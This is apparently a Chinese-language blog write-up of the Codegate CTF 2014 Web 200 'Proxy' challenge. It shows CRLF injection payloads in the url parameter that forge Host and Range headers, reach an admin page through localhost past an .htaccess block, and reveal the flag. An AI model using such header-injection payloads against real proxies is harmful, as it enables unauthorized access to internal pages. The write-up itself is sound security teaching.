title: Codegate CTF Preliminary 2014 200 Web Proxy
date: 2014-2-26 2:24
category: web
tags: Codegate CTF, CRLF
slug: codegate_web_200_web_proxy

這題被 **orange** 秒殺了  
我是賽後才解出來的 Orz  
* * *  
  
網址點開是一個 proxy 頁面  
在 input form 輸入網址後  
會將網頁的部分內容和 header 印出來  

打開 source code 可以看到註解有提示  
*<!-- admin/index.php -->*  
嘗試用 proxy load 頁面看看:  
`http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/index.php`  
> 403 Forbidden  

這題的方向應該很明確了  
透過 proxy 去存取 `admin.php`  
題目的環境是 **apache**  
應該是透過 `.htaccess` 去擋的  
不過似乎沒辦法拿到設定  

先隨便跳轉一個網頁  
`http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=www.google.com`  
會發現 proxy 是透過參數 `url` 決定轉址頁面  
猜測是透過 `header('Location:'+ $url);` 去做轉址  
如果 `$url` 沒有做過濾  
會有 **HTTP header CRLF injection**  
試試看猜測是否正確:  
```
http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=www.google.com%2f   
HTTP/1.1%0d%0a  
Host: 123%0d%0a  
%0d%0a  
```
> ...  
> Date: Tue, 25 Feb 2014 19:00:30 GMT  
> Server: gws  
> Content-Length: 261  
> X-XSS-Protection: 1; mode=block  

喔喔 看起來有反應  
還意外發現 google 的 **XSS protect** XD  
這邊我們可以偽造 header 竄改來源了  
但是網站好像有做過濾  
只要包含 `58.229.183.24` 都會被擋下來  
顯示 *Access Denied*  
改嘗試從 **localhost** 去連頁面:  
`url=localhost/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/`  
> HTTP/1.1 200 OK  
> Date: Tue, 25 Feb 2014 18:49:08 GMT  
> Server: Apache/2.4.6 (Ubuntu)  

如此就繞過 `.htaccess` 的限制了 lol  
由於這個 proxy 只會顯示網頁的部分內容  
在 header 加入 `Range` 可以控制顯示內容範圍  
```  
Host: 123%0d%0a  
Range: bytes=0-100%0d%0a  
%0d%0a  
```  

慢慢dump內容，結果發現...  
> Access Denied  
> \<br> 100  

好吧 看來 code 可能也是有做些存取限制  
嘗試改成 `Host: localhost`  
... fail again  
在這邊卡關了一陣子  
決定還是慢慢把全部內容 dump 出來  
結果發現這一段...  
> $\_SERVER[HTTP_HOST]=="hackme")-->\</body>  
> <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">  

所以改成 `Host: hackme`  
這題就過了  
> hello admin\<br>  
> Password is WH0_IS_SnUS_bI1G_F4N  

flag: `WH0_IS_SnUS_bI1G_F4N`  
